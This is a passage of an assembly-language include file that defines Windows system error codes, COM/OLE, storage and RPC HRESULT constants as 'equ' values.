ERROR_SERVICE_DOES_NOT_EXIST equ 1060
ERROR_SERVICE_CANNOT_ACCEPT_CTRL equ 1061
ERROR_SERVICE_NOT_ACTIVE equ 1062
ERROR_FAILED_SERVICE_CONTROLLER_CONNECT equ 1063
ERROR_EXCEPTION_IN_SERVICE equ 1064
ERROR_DATABASE_DOES_NOT_EXIST equ 1065
ERROR_SERVICE_SPECIFIC_ERROR equ 1066
ERROR_PROCESS_ABORTED equ 1067
ERROR_SERVICE_DEPENDENCY_FAIL equ 1068
ERROR_SERVICE_LOGON_FAILED equ 1069
ERROR_SERVICE_START_HANG equ 1070
ERROR_INVALID_SERVICE_LOCK equ 1071
ERROR_SERVICE_MARKED_FOR_DELETE equ 1072
ERROR_SERVICE_EXISTS equ 1073
ERROR_ALREADY_RUNNING_LKG equ 1074
ERROR_SERVICE_DEPENDENCY_DELETED equ 1075
ERROR_BOOT_ALREADY_ACCEPTED equ 1076
ERROR_SERVICE_NEVER_STARTED equ 1077
ERROR_DUPLICATE_SERVICE_NAME equ 1078
ERROR_END_OF_MEDIA equ 1100
ERROR_FILEMARK_DETECTED equ 1101
ERROR_BEGINNING_OF_MEDIA equ 1102
ERROR_SETMARK_DETECTED equ 1103
ERROR_NO_DATA_DETECTED equ 1104
ERROR_PARTITION_FAILURE equ 1105
ERROR_INVALID_BLOCK_LENGTH equ 1106
ERROR_DEVICE_NOT_PARTITIONED equ 1107
ERROR_UNABLE_TO_LOCK_MEDIA equ 1108
ERROR_UNABLE_TO_UNLOAD_MEDIA equ 1109
ERROR_MEDIA_CHANGED equ 1110
ERROR_BUS_RESET equ 1111
ERROR_NO_MEDIA_IN_DRIVE equ 1112
ERROR_NO_UNICODE_TRANSLATION equ 1113
ERROR_DLL_INIT_FAILED equ 1114
ERROR_SHUTDOWN_IN_PROGRESS equ 1115
ERROR_NO_SHUTDOWN_IN_PROGRESS equ 1116
ERROR_IO_DEVICE equ 1117
ERROR_SERIAL_NO_DEVICE equ 1118
ERROR_IRQ_BUSY equ 1119
ERROR_MORE_WRITES equ 1120
ERROR_COUNTER_TIMEOUT equ 1121
ERROR_FLOPPY_ID_MARK_NOT_FOUND equ 1122
ERROR_FLOPPY_WRONG_CYLINDER equ 1123
ERROR_FLOPPY_UNKNOWN_ERROR equ 1124
ERROR_FLOPPY_BAD_REGISTERS equ 1125
ERROR_DISK_RECALIBRATE_FAILED equ 1126
ERROR_DISK_OPERATION_FAILED equ 1127
ERROR_DISK_RESET_FAILED equ 1128
ERROR_EOM_OVERFLOW equ 1129
ERROR_NOT_ENOUGH_SERVER_MEMORY equ 1130
ERROR_POSSIBLE_DEADLOCK equ 1131
ERROR_MAPPED_ALIGNMENT equ 1132
ERROR_INVALID_PIXEL_FORMAT equ 2000
ERROR_BAD_DRIVER equ 2001
ERROR_INVALID_WINDOW_STYLE equ 2002
ERROR_METAFILE_NOT_SUPPORTED equ 2003
ERROR_TRANSFORM_NOT_SUPPORTED equ 2004
ERROR_CLIPPING_NOT_SUPPORTED equ 2005
ERROR_UNKNOWN_PRINT_MONITOR equ 3000
ERROR_PRINTER_DRIVER_IN_USE equ 3001
ERROR_SPOOL_FILE_NOT_FOUND equ 3002
ERROR_SPL_NO_STARTDOC equ 3003
ERROR_SPL_NO_ADDJOB equ 3004
ERROR_PRINT_PROCESSOR_ALREADY_INSTALLED equ 3005
ERROR_PRINT_MONITOR_ALREADY_INSTALLED equ 3006
ERROR_WINS_INTERNAL equ 4000
ERROR_CAN_NOT_DEL_LOCAL_WINS equ 4001
ERROR_STATIC_INIT equ 4002
ERROR_INC_BACKUP equ 4003
ERROR_FULL_BACKUP equ 4004
ERROR_REC_NON_EXISTENT equ 4005
ERROR_RPL_NOT_ALLOWED equ 4006
SEVERITY_SUCCESS equ 0
SEVERITY_ERROR equ 1
FACILITY_NT_BIT equ 10000000h
NOERROR equ 0
E_UNEXPECTED equ 8000FFFFh
E_NOTIMPL equ 80004001h
E_OUTOFMEMORY equ 8007000Eh
E_INVALIDARG equ 80070057h
E_NOINTERFACE equ 80004002h
E_POINTER equ 80004003h
E_HANDLE equ 80070006h
E_ABORT equ 80004004h
E_FAIL equ 80004005h
E_ACCESSDENIED equ 80070005h
CO_E_INIT_TLS equ 80004006h
CO_E_INIT_SHARED_ALLOCATOR equ 80004007h
CO_E_INIT_MEMORY_ALLOCATOR equ 80004008h
CO_E_INIT_CLASS_CACHE equ 80004009h
CO_E_INIT_RPC_CHANNEL equ 8000400Ah
CO_E_INIT_TLS_SET_CHANNEL_CONTROL equ 8000400Bh
CO_E_INIT_TLS_CHANNEL_CONTROL equ 8000400Ch
CO_E_INIT_UNACCEPTED_USER_ALLOCATOR equ 8000400Dh
CO_E_INIT_SCM_MUTEX_EXISTS equ 8000400Eh
CO_E_INIT_SCM_FILE_MAPPING_EXISTS equ 8000400Fh
CO_E_INIT_SCM_MAP_VIEW_OF_FILE equ 80004010h
CO_E_INIT_SCM_EXEC_FAILURE equ 80004011h
CO_E_INIT_ONLY_SINGLE_THREADED equ 80004012h
S_OK equ 0h
S_FALSE equ 1h
OLE_E_FIRST equ 80040000h
OLE_E_LAST equ 800400FFh
OLE_S_FIRST equ 40000h
OLE_S_LAST equ 400FFh
OLE_E_OLEVERB equ 80040000h
OLE_E_ADVF equ 80040001h
OLE_E_ENUM_NOMORE equ 80040002h
OLE_E_ADVISENOTSUPPORTED equ 80040003h
OLE_E_NOCONNECTION equ 80040004h
OLE_E_NOTRUNNING equ 80040005h
OLE_E_NOCACHE equ 80040006h
OLE_E_BLANK equ 80040007h
OLE_E_CLASSDIFF equ 80040008h
OLE_E_CANT_GETMONIKER equ 80040009h
OLE_E_CANT_BINDTOSOURCE equ 8004000Ah
OLE_E_STATIC equ 8004000Bh
OLE_E_PROMPTSAVECANCELLED equ 8004000Ch
OLE_E_INVALIDRECT equ 8004000Dh
OLE_E_WRONGCOMPOBJ equ 8004000Eh
OLE_E_INVALIDHWND equ 8004000Fh
OLE_E_NOT_INPLACEACTIVE equ 80040010h
OLE_E_CANTCONVERT equ 80040011h
OLE_E_NOSTORAGE equ 80040012h
DV_E_FORMATETC equ 80040064h
DV_E_DVTARGETDEVICE equ 80040065h
DV_E_STGMEDIUM equ 80040066h
DV_E_STATDATA equ 80040067h
DV_E_LINDEX equ 80040068h
DV_E_TYMED equ 80040069h
DV_E_CLIPFORMAT equ 8004006Ah
DV_E_DVASPECT equ 8004006Bh
DV_E_DVTARGETDEVICE_SIZE equ 8004006Ch
DV_E_NOIVIEWOBJECT equ 8004006Dh
DRAGDROP_E_FIRST equ 80040100h
DRAGDROP_E_LAST equ 8004010Fh
DRAGDROP_S_FIRST equ 40100h
DRAGDROP_S_LAST equ 4010Fh
DRAGDROP_E_NOTREGISTERED equ 80040100h
DRAGDROP_E_ALREADYREGISTERED equ 80040101h
DRAGDROP_E_INVALIDHWND equ 80040102h
CLASSFACTORY_E_FIRST equ 80040110h
CLASSFACTORY_E_LAST equ 8004011Fh
CLASSFACTORY_S_FIRST equ 40110h
CLASSFACTORY_S_LAST equ 4011Fh
CLASS_E_NOAGGREGATION equ 80040110h
CLASS_E_CLASSNOTAVAILABLE equ 80040111h
MARSHAL_E_FIRST equ 80040120h
MARSHAL_E_LAST equ 8004012Fh
MARSHAL_S_FIRST equ 40120h
MARSHAL_S_LAST equ 4012Fh
DATA_E_FIRST equ 80040130h
DATA_E_LAST equ 8004013Fh
DATA_S_FIRST equ 40130h
DATA_S_LAST equ 4013Fh
VIEW_E_FIRST equ 80040140h
VIEW_E_LAST equ 8004014Fh
VIEW_S_FIRST equ 40140h
VIEW_S_LAST equ 4014Fh
VIEW_E_DRAW equ 80040140h
REGDB_E_FIRST equ 80040150h
REGDB_E_LAST equ 8004015Fh
REGDB_S_FIRST equ 40150h
REGDB_S_LAST equ 4015Fh
REGDB_E_READREGDB equ 80040150h
REGDB_E_WRITEREGDB equ 80040151h
REGDB_E_KEYMISSING equ 80040152h
REGDB_E_INVALIDVALUE equ 80040153h
REGDB_E_CLASSNOTREG equ 80040154h
REGDB_E_IIDNOTREG equ 80040155h
CACHE_E_FIRST equ 80040170h
CACHE_E_LAST equ 8004017Fh
CACHE_S_FIRST equ 40170h
CACHE_S_LAST equ 4017Fh
CACHE_E_NOCACHE_UPDATED equ 80040170h
OLEOBJ_E_FIRST equ 80040180h
OLEOBJ_E_LAST equ 8004018Fh
OLEOBJ_S_FIRST equ 40180h
OLEOBJ_S_LAST equ 4018Fh
OLEOBJ_E_NOVERBS equ 80040180h
OLEOBJ_E_INVALIDVERB equ 80040181h
CLIENTSITE_E_FIRST equ 80040190h
CLIENTSITE_E_LAST equ 8004019Fh
CLIENTSITE_S_FIRST equ 40190h
CLIENTSITE_S_LAST equ 4019Fh
INPLACE_E_NOTUNDOABLE equ 800401A0h
INPLACE_E_NOTOOLSPACE equ 800401A1h
INPLACE_E_FIRST equ 800401A0h
INPLACE_E_LAST equ 800401AFh
INPLACE_S_FIRST equ 401A0h
INPLACE_S_LAST equ 401AFh
ENUM_E_FIRST equ 800401B0h
ENUM_E_LAST equ 800401BFh
ENUM_S_FIRST equ 401B0h
ENUM_S_LAST equ 401BFh
CONVERT10_E_FIRST equ 800401C0h
CONVERT10_E_LAST equ 800401CFh
CONVERT10_S_FIRST equ 401C0h
CONVERT10_S_LAST equ 401CFh
CONVERT10_E_OLESTREAM_GET equ 800401C0h
CONVERT10_E_OLESTREAM_PUT equ 800401C1h
CONVERT10_E_OLESTREAM_FMT equ 800401C2h
CONVERT10_E_OLESTREAM_BITMAP_TO_DIB equ 800401C3h
CONVERT10_E_STG_FMT equ 800401C4h
CONVERT10_E_STG_NO_STD_STREAM equ 800401C5h
CONVERT10_E_STG_DIB_TO_BITMAP equ 800401C6h
CLIPBRD_E_FIRST equ 800401D0h
CLIPBRD_E_LAST equ 800401DFh
CLIPBRD_S_FIRST equ 401D0h
CLIPBRD_S_LAST equ 401DFh
CLIPBRD_E_CANT_OPEN equ 800401D0h
CLIPBRD_E_CANT_EMPTY equ 800401D1h
CLIPBRD_E_CANT_SET equ 800401D2h
CLIPBRD_E_BAD_DATA equ 800401D3h
CLIPBRD_E_CANT_CLOSE equ 800401D4h
MK_E_FIRST equ 800401E0h
MK_E_LAST equ 800401EFh
MK_S_FIRST equ 401E0h
MK_S_LAST equ 401EFh
MK_E_CONNECTMANUALLY equ 800401E0h
MK_E_EXCEEDEDDEADLINE equ 800401E1h
MK_E_NEEDGENERIC equ 800401E2h
MK_E_UNAVAILABLE equ 800401E3h
MK_E_SYNTAX equ 800401E4h
MK_E_NOOBJECT equ 800401E5h
MK_E_INVALIDEXTENSION equ 800401E6h
MK_E_INTERMEDIATEINTERFACENOTSUPPORTED equ 800401E7h
MK_E_NOTBINDABLE equ 800401E8h
MK_E_NOTBOUND equ 800401E9h
MK_E_CANTOPENFILE equ 800401EAh
MK_E_MUSTBOTHERUSER equ 800401EBh
MK_E_NOINVERSE equ 800401ECh
MK_E_NOSTORAGE equ 800401EDh
MK_E_NOPREFIX equ 800401EEh
MK_E_ENUMERATION_FAILED equ 800401EFh
CO_E_FIRST equ 800401F0h
CO_E_LAST equ 800401FFh
CO_S_FIRST equ 401F0h
CO_S_LAST equ 401FFh
CO_E_NOTINITIALIZED equ 800401F0h
CO_E_ALREADYINITIALIZED equ 800401F1h
CO_E_CANTDETERMINECLASS equ 800401F2h
CO_E_CLASSSTRING equ 800401F3h
CO_E_IIDSTRING equ 800401F4h
CO_E_APPNOTFOUND equ 800401F5h
CO_E_APPSINGLEUSE equ 800401F6h
CO_E_ERRORINAPP equ 800401F7h
CO_E_DLLNOTFOUND equ 800401F8h
CO_E_ERRORINDLL equ 800401F9h
CO_E_WRONGOSFORAPP equ 800401FAh
CO_E_OBJNOTREG equ 800401FBh
CO_E_OBJISREG equ 800401FCh
CO_E_OBJNOTCONNECTED equ 800401FDh
CO_E_APPDIDNTREG equ 800401FEh
CO_E_RELEASED equ 800401FFh
OLE_S_USEREG equ 40000h
OLE_S_STATIC equ 40001h
OLE_S_MAC_CLIPFORMAT equ 40002h
DRAGDROP_S_DROP equ 40100h
DRAGDROP_S_CANCEL equ 40101h
DRAGDROP_S_USEDEFAULTCURSORS equ 40102h
DATA_S_SAMEFORMATETC equ 40130h
VIEW_S_ALREADY_FROZEN equ 40140h
CACHE_S_FORMATETC_NOTSUPPORTED equ 40170h
CACHE_S_SAMECACHE equ 40171h
CACHE_S_SOMECACHES_NOTUPDATED equ 40172h
OLEOBJ_S_INVALIDVERB equ 40180h
OLEOBJ_S_CANNOT_DOVERB_NOW equ 40181h
OLEOBJ_S_INVALIDHWND equ 40182h
INPLACE_S_TRUNCATED equ 401A0h
CONVERT10_S_NO_PRESENTATION equ 401C0h
MK_S_REDUCED_TO_SELF equ 401E2h
MK_S_ME equ 401E4h
MK_S_HIM equ 401E5h
MK_S_US equ 401E6h
MK_S_MONIKERALREADYREGISTERED equ 401E7h
CO_E_CLASS_CREATE_FAILED equ 80080001h
CO_E_SCM_ERROR equ 80080002h
CO_E_SCM_RPC_FAILURE equ 80080003h
CO_E_BAD_PATH equ 80080004h
CO_E_SERVER_EXEC_FAILURE equ 80080005h
CO_E_OBJSRV_RPC_FAILURE equ 80080006h
MK_E_NO_NORMALIZED equ 80080007h
CO_E_SERVER_STOPPING equ 80080008h
MEM_E_INVALID_ROOT equ 80080009h
MEM_E_INVALID_LINK equ 80080010h
MEM_E_INVALID_SIZE equ 80080011h
DISP_E_UNKNOWNINTERFACE equ 80020001h
DISP_E_MEMBERNOTFOUND equ 80020003h
DISP_E_PARAMNOTFOUND equ 80020004h
DISP_E_TYPEMISMATCH equ 80020005h
DISP_E_UNKNOWNNAME equ 80020006h
DISP_E_NONAMEDARGS equ 80020007h
DISP_E_BADVARTYPE equ 80020008h
DISP_E_EXCEPTION equ 80020009h
DISP_E_OVERFLOW equ 8002000Ah
DISP_E_BADINDEX equ 8002000Bh
DISP_E_UNKNOWNLCID equ 8002000Ch
DISP_E_ARRAYISLOCKED equ 8002000Dh
DISP_E_BADPARAMCOUNT equ 8002000Eh
DISP_E_PARAMNOTOPTIONAL equ 8002000Fh
DISP_E_BADCALLEE equ 80020010h
DISP_E_NOTACOLLECTION equ 80020011h
TYPE_E_BUFFERTOOSMALL equ 80028016h
TYPE_E_INVDATAREAD equ 80028018h
TYPE_E_UNSUPFORMAT equ 80028019h
TYPE_E_REGISTRYACCESS equ 8002801Ch
TYPE_E_LIBNOTREGISTERED equ 8002801Dh
TYPE_E_UNDEFINEDTYPE equ 80028027h
TYPE_E_QUALIFIEDNAMEDISALLOWED equ 80028028h
TYPE_E_INVALIDSTATE equ 80028029h
TYPE_E_WRONGTYPEKIND equ 8002802Ah
TYPE_E_ELEMENTNOTFOUND equ 8002802Bh
TYPE_E_AMBIGUOUSNAME equ 8002802Ch
TYPE_E_NAMECONFLICT equ 8002802Dh
TYPE_E_UNKNOWNLCID equ 8002802Eh
TYPE_E_DLLFUNCTIONNOTFOUND equ 8002802Fh
TYPE_E_BADMODULEKIND equ 800288BDh
TYPE_E_SIZETOOBIG equ 800288C5h
TYPE_E_DUPLICATEID equ 800288C6h
TYPE_E_INVALIDID equ 800288CFh
TYPE_E_TYPEMISMATCH equ 80028CA0h
TYPE_E_OUTOFBOUNDS equ 80028CA1h
TYPE_E_IOERROR equ 80028CA2h
TYPE_E_CANTCREATETMPFILE equ 80028CA3h
TYPE_E_CANTLOADLIBRARY equ 80029C4Ah
TYPE_E_INCONSISTENTPROPFUNCS equ 80029C83h
TYPE_E_CIRCULARTYPE equ 80029C84h
STG_E_INVALIDFUNCTION equ 80030001h
STG_E_FILENOTFOUND equ 80030002h
STG_E_PATHNOTFOUND equ 80030003h
STG_E_TOOMANYOPENFILES equ 80030004h
STG_E_ACCESSDENIED equ 80030005h
STG_E_INVALIDHANDLE equ 80030006h
STG_E_INSUFFICIENTMEMORY equ 80030008h
STG_E_INVALIDPOINTER equ 80030009h
STG_E_NOMOREFILES equ 80030012h
STG_E_DISKISWRITEPROTECTED equ 80030013h
STG_E_SEEKERROR equ 80030019h
STG_E_WRITEFAULT equ 8003001Dh
STG_E_READFAULT equ 8003001Eh
STG_E_SHAREVIOLATION equ 80030020h
STG_E_LOCKVIOLATION equ 80030021h
STG_E_FILEALREADYEXISTS equ 80030050h
STG_E_INVALIDPARAMETER equ 80030057h
STG_E_MEDIUMFULL equ 80030070h
STG_E_ABNORMALAPIEXIT equ 800300FAh
STG_E_INVALIDHEADER equ 800300FBh
STG_E_INVALIDNAME equ 800300FCh
STG_E_UNKNOWN equ 800300FDh
STG_E_UNIMPLEMENTEDFUNCTION equ 800300FEh
STG_E_INVALIDFLAG equ 800300FFh
STG_E_INUSE equ 80030100h
STG_E_NOTCURRENT equ 80030101h
STG_E_REVERTED equ 80030102h
STG_E_CANTSAVE equ 80030103h
STG_E_OLDFORMAT equ 80030104h
STG_E_OLDDLL equ 80030105h
STG_E_SHAREREQUIRED equ 80030106h
STG_E_NOTFILEBASEDSTORAGE equ 80030107h
STG_E_EXTANTMARSHALLINGS equ 80030108h
STG_S_CONVERTED equ 30200h
RPC_E_CALL_REJECTED equ 80010001h
RPC_E_CALL_CANCELED equ 80010002h
RPC_E_CANTPOST_INSENDCALL equ 80010003h
RPC_E_CANTCALLOUT_INASYNCCALL equ 80010004h
RPC_E_CANTCALLOUT_INEXTERNALCALL equ 80010005h
RPC_E_CONNECTION_TERMINATED equ 80010006h
RPC_E_SERVER_DIED equ 80010007h
RPC_E_CLIENT_DIED equ 80010008h
RPC_E_INVALID_DATAPACKET equ 80010009h
RPC_E_CANTTRANSMIT_CALL equ 8001000Ah
RPC_E_CLIENT_CANTMARSHAL_DATA equ 8001000Bh
RPC_E_CLIENT_CANTUNMARSHAL_DATA equ 8001000Ch
RPC_E_SERVER_CANTMARSHAL_DATA equ 8001000Dh
RPC_E_SERVER_CANTUNMARSHAL_DATA equ 8001000Eh
RPC_E_INVALID_DATA equ 8001000Fh
RPC_E_INVALID_PARAMETER equ 80010010h
RPC_E_CANTCALLOUT_AGAIN equ 80010011h
RPC_E_SERVER_DIED_DNE equ 80010012h
RPC_E_SYS_CALL_FAILED equ 80010100h
RPC_E_OUT_OF_RESOURCES equ 80010101h
RPC_E_ATTEMPTED_MULTITHREAD equ 80010102h
RPC_E_NOT_REGISTERED equ 80010103h
RPC_E_FAULT equ 80010104h
RPC_E_SERVERFAULT equ 80010105h
RPC_E_CHANGED_MODE equ 80010106h
RPC_E_INVALIDMETHOD equ 80010107h
RPC_E_DISCONNECTED equ 80010108h
RPC_E_RETRY equ 80010109h
RPC_E_SERVERCALL_RETRYLATER equ 8001010Ah
RPC_E_SERVERCALL_REJECTED equ 8001010Bh
RPC_E_INVALID_CALLDATA equ 8001010Ch
RPC_E_CANTCALLOUT_ININPUTSYNCCALL equ 8001010Dh
RPC_E_WRONG_THREAD equ 8001010Eh
RPC_E_THREAD_NOT_INIT equ 8001010Fh
RPC_E_UNEXPECTED equ 8001FFFFh
ERROR_BAD_USERNAME equ 2202
ERROR_NOT_CONNECTED equ 2250
ERROR_OPEN_FILES equ 2401
ERROR_DEVICE_IN_USE equ 2404
ERROR_BAD_DEVICE equ 1200
ERROR_CONNECTION_UNAVAIL equ 1201
ERROR_DEVICE_ALREADY_REMEMBERED equ 1202
ERROR_NO_NET_OR_BAD_PATH equ 1203
ERROR_BAD_PROVIDER equ 1204
ERROR_CANNOT_OPEN_PROFILE equ 1205
ERROR_BAD_PROFILE equ 1206
ERROR_NOT_CONTAINER equ 1207
ERROR_EXTENDED_ERROR equ 1208
ERROR_INVALID_GROUPNAME equ 1209
ERROR_INVALID_COMPUTERNAME equ 1210
ERROR_INVALID_EVENTNAME equ 1211
ERROR_INVALID_DOMAINNAME equ 1212
ERROR_INVALID_SERVICENAME equ 1213
ERROR_INVALID_NETNAME equ 1214
ERROR_INVALID_SHARENAME equ 1215
ERROR_INVALID_PASSWORDNAME equ 1216
ERROR_INVALID_MESSAGENAME equ 1217
ERROR_INVALID_MESSAGEDEST equ 1218
ERROR_SESSION_CREDENTIAL_CONFLICT equ 1219
ERROR_REMOTE_SESSION_LIMIT_EXCEEDED equ 1220
ERROR_DUP_DOMAINNAME equ 1221
ERROR_NO_NETWORK equ 1222
ERROR_NOT_ALL_ASSIGNED equ 1300
ERROR_SOME_NOT_MAPPED equ 1301
ERROR_NO_QUOTAS_FOR_ACCOUNT equ 1302
ERROR_LOCAL_USER_SESSION_KEY equ 1303
ERROR_NULL_LM_PASSWORD equ 1304
ERROR_UNKNOWN_REVISION equ 1305
ERROR_REVISION_MISMATCH equ 1306
ERROR_INVALID_OWNER equ 1307
ERROR_INVALID_PRIMARY_GROUP equ 1308
ERROR_NO_IMPERSONATION_TOKEN equ 1309
ERROR_CANT_DISABLE_MANDATORY equ 1310
ERROR_NO_LOGON_SERVERS equ 1311
ERROR_NO_SUCH_LOGON_SESSION equ 1312
ERROR_NO_SUCH_PRIVILEGE equ 1313
ERROR_PRIVILEGE_NOT_HELD equ 1314
ERROR_INVALID_ACCOUNT_NAME equ 1315
ERROR_USER_EXISTS equ 1316
ERROR_NO_SUCH_USER equ 1317
ERROR_GROUP_EXISTS equ 1318
ERROR_NO_SUCH_GROUP equ 1319
ERROR_MEMBER_IN_GROUP equ 1320
ERROR_MEMBER_NOT_IN_GROUP equ 1321
ERROR_LAST_ADMIN equ 1322
ERROR_WRONG_PASSWORD equ 1323
ERROR_ILL_FORMED_PASSWORD equ 1324
ERROR_PASSWORD_RESTRICTION equ 1325
ERROR_LOGON_FAILURE equ 1326
ERROR_ACCOUNT_RESTRICTION equ 1327
ERROR_INVALID_LOGON_HOURS equ 1328
ERROR_INVALID_WORKSTATION equ 1329
ERROR_PASSWORD_EXPIRED equ 1330
ERROR_ACCOUNT_DISABLED equ 1331
ERROR_NONE_MAPPED equ 1332
ERROR_TOO_MANY_LUIDS_REQUESTED equ 1333
ERROR_LUIDS_EXHAUSTED equ 1334
ERROR_INVALID_SUB_AUTHORITY equ 1335
ERROR_INVALID_ACL equ 1336
ERROR_INVALID_SID equ 1337
ERROR_INVALID_SECURITY_DESCR equ 1338
ERROR_BAD_INHERITANCE_ACL equ 1340
ERROR_SERVER_DISABLED equ 1341
ERROR_SERVER_NOT_DISABLED equ 1342
ERROR_INVALID_ID_AUTHORITY equ 1343
ERROR_ALLOTTED_SPACE_EXCEEDED equ 1344
ERROR_INVALID_GROUP_ATTRIBUTES equ 1345
ERROR_BAD_IMPERSONATION_LEVEL equ 1346
ERROR_CANT_OPEN_ANONYMOUS equ 1347
ERROR_BAD_VALIDATION_CLASS equ 1348
ERROR_BAD_TOKEN_TYPE equ 1349
ERROR_NO_SECURITY_ON_OBJECT equ 1350
ERROR_CANT_ACCESS_DOMAIN_INFO equ 1351
ERROR_INVALID_SERVER_STATE equ 1352
ERROR_INVALID_DOMAIN_STATE equ 1353
ERROR_INVALID_DOMAIN_ROLE equ 1354
ERROR_NO_SUCH_DOMAIN equ 1355
ERROR_DOMAIN_EXISTS equ 1356
ERROR_DOMAIN_LIMIT_EXCEEDED equ 1357
ERROR_INTERNAL_DB_CORRUPTION equ 1358
ERROR_INTERNAL_ERROR equ 1359
ERROR_GENERIC_NOT_MAPPED equ 1360
ERROR_BAD_DESCRIPTOR_FORMAT equ 1361
ERROR_NOT_LOGON_PROCESS equ 1362
ERROR_LOGON_SESSION_EXISTS equ 1363
ERROR_NO_SUCH_PACKAGE equ 1364
ERROR_BAD_LOGON_SESSION_STATE equ 1365
ERROR_LOGON_SESSION_COLLISION equ 1366
ERROR_INVALID_LOGON_TYPE equ 1367
ERROR_CANNOT_IMPERSONATE equ 1368
ERROR_RXACT_INVALID_STATE equ 1369
ERROR_RXACT_COMMIT_FAILURE equ 1370
ERROR_SPECIAL_ACCOUNT equ 1371
ERROR_SPECIAL_GROUP equ 1372
ERROR_SPECIAL_USER equ 1373
ERROR_MEMBERS_PRIMARY_GROUP equ 1374
ERROR_TOKEN_ALREADY_IN_USE equ 1375
ERROR_NO_SUCH_ALIAS equ 1376
ERROR_MEMBER_NOT_IN_ALIAS equ 1377
ERROR_MEMBER_IN_ALIAS equ 1378
ERROR_ALIAS_EXISTS equ 1379
ERROR_LOGON_NOT_GRANTED equ 1380
ERROR_TOO_MANY_SECRETS equ 1381
ERROR_SECRET_TOO_LONG equ 1382
ERROR_INTERNAL_DB_ERROR equ 1383
ERROR_TOO_MANY_CONTEXT_IDS equ 1384
ERROR_LOGON_TYPE_NOT_GRANTED equ 1385
ERROR_NT_CROSS_ENCRYPTION_REQUIRED equ 1386
ERROR_NO_SUCH_MEMBER equ 1387
ERROR_INVALID_MEMBER equ 1388
ERROR_TOO_MANY_SIDS equ 1389
ERROR_LM_CROSS_ENCRYPTION_REQUIRED equ 1390
ERROR_NO_INHERITANCE equ 1391
ERROR_FILE_CORRUPT equ 1392
ERROR_DISK_CORRUPT equ 1393
ERROR_NO_USER_SESSION_KEY equ 1394
ERROR_INVALID_WINDOW_HANDLE equ 1400
ERROR_INVALID_MENU_HANDLE equ 1401
ERROR_INVALID_CURSOR_HANDLE equ 1402
ERROR_INVALID_ACCEL_HANDLE equ 1403
ERROR_INVALID_HOOK_HANDLE equ 1404
ERROR_INVALID_DWP_HANDLE equ 1405
ERROR_TLW_WITH_WSCHILD equ 1406
ERROR_CANNOT_FIND_WND_CLASS equ 1407
ERROR_WINDOW_OF_OTHER_THREAD equ 1408
ERROR_HOTKEY_ALREADY_REGISTERED equ 1409
ERROR_CLASS_ALREADY_EXISTS equ 1410
ERROR_CLASS_DOES_NOT_EXIST equ 1411
ERROR_CLASS_HAS_WINDOWS equ 1412
ERROR_INVALID_INDEX equ 1413
ERROR_INVALID_ICON_HANDLE equ 1414
ERROR_PRIVATE_DIALOG_INDEX equ 1415
ERROR_LISTBOX_ID_NOT_FOUND equ 1416
ERROR_NO_WILDCARD_CHARACTERS equ 1417
ERROR_CLIPBOARD_NOT_OPEN equ 1418
ERROR_HOTKEY_NOT_REGISTERED equ 1419
ERROR_WINDOW_NOT_DIALOG equ 1420
ERROR_CONTROL_ID_NOT_FOUND equ 1421
ERROR_INVALID_COMBOBOX_MESSAGE equ 1422
ERROR_WINDOW_NOT_COMBOBOX equ 1423
ERROR_INVALID_EDIT_HEIGHT equ 1424
ERROR_DC_NOT_FOUND equ 1425
ERROR_INVALID_HOOK_FILTER equ 1426
ERROR_INVALID_FILTER_PROC equ 1427
ERROR_HOOK_NEEDS_HMOD equ 1428
ERROR_PUBLIC_ONLY_HOOK equ 1429
ERROR_JOURNAL_HOOK_SET equ 1430
ERROR_HOOK_NOT_INSTALLED equ 1431
ERROR_INVALID_LB_MESSAGE equ 1432
ERROR_SETCOUNT_ON_BAD_LB equ 1433
ERROR_LB_WITHOUT_TABSTOPS equ 1434
ERROR_DESTROY_OBJECT_OF_OTHER_THREAD equ 1435
ERROR_CHILD_WINDOW_MENU equ 1436
ERROR_NO_SYSTEM_MENU equ 1437
ERROR_INVALID_MSGBOX_STYLE equ 1438
ERROR_INVALID_SPI_VALUE equ 1439
ERROR_SCREEN_ALREADY_LOCKED equ 1440
ERROR_HWNDS_HAVE_DIFF_PARENT equ 1441
ERROR_NOT_CHILD_WINDOW equ 1442
ERROR_INVALID_GW_COMMAND equ 1443
ERROR_INVALID_THREAD_ID equ 1444
ERROR_NON_MDICHILD_WINDOW equ 1445
ERROR_POPUP_ALREADY_ACTIVE equ 1446
ERROR_NO_SCROLLBARS equ 1447
ERROR_INVALID_SCROLLBAR_RANGE equ 1448
ERROR_INVALID_SHOWWIN_COMMAND equ 1449
ERROR_EVENTLOG_FILE_CORRUPT equ 1500
ERROR_EVENTLOG_CANT_START equ 1501
ERROR_LOG_FILE_FULL equ 1502
ERROR_EVENTLOG_FILE_CHANGED equ 1503
RPC_S_INVALID_STRING_BINDING equ 1700
RPC_S_WRONG_KIND_OF_BINDING equ 1701
RPC_S_INVALID_BINDING equ 1702
RPC_S_PROTSEQ_NOT_SUPPORTED equ 1703
RPC_S_INVALID_RPC_PROTSEQ equ 1704
RPC_S_INVALID_STRING_UUID equ 1705
RPC_S_INVALID_ENDPOINT_FORMAT equ 1706
RPC_S_INVALID_NET_ADDR equ 1707
RPC_S_NO_ENDPOINT_FOUND equ 1708
RPC_S_INVALID_TIMEOUT equ 1709
RPC_S_OBJECT_NOT_FOUND equ 1710
RPC_S_ALREADY_REGISTERED equ 1711
RPC_S_TYPE_ALREADY_REGISTERED equ 1712
RPC_S_ALREADY_LISTENING equ 1713
RPC_S_NO_PROTSEQS_REGISTERED equ 1714
RPC_S_NOT_LISTENING equ 1715
RPC_S_UNKNOWN_MGR_TYPE equ 1716
RPC_S_UNKNOWN_IF equ 1717
RPC_S_NO_BINDINGS equ 1718
RPC_S_NO_PROTSEQS equ 1719
RPC_S_CANT_CREATE_ENDPOINT equ 1720
RPC_S_OUT_OF_RESOURCES equ 1721
RPC_S_SERVER_UNAVAILABLE equ 1722
RPC_S_SERVER_TOO_BUSY equ 1723
RPC_S_INVALID_NETWORK_OPTIONS equ 1724
RPC_S_NO_CALL_ACTIVE equ 1725
RPC_S_CALL_FAILED equ 1726
RPC_S_CALL_FAILED_DNE equ 1727
RPC_S_PROTOCOL_ERROR equ 1728
RPC_S_UNSUPPORTED_TRANS_SYN equ 1730
RPC_S_UNSUPPORTED_TYPE equ 1732
RPC_S_INVALID_TAG equ 1733
RPC_S_INVALID_BOUND equ 1734
RPC_S_NO_ENTRY_NAME equ 1735
RPC_S_INVALID_NAME_SYNTAX equ 1736
RPC_S_UNSUPPORTED_NAME_SYNTAX equ 1737
RPC_S_UUID_NO_ADDRESS equ 1739
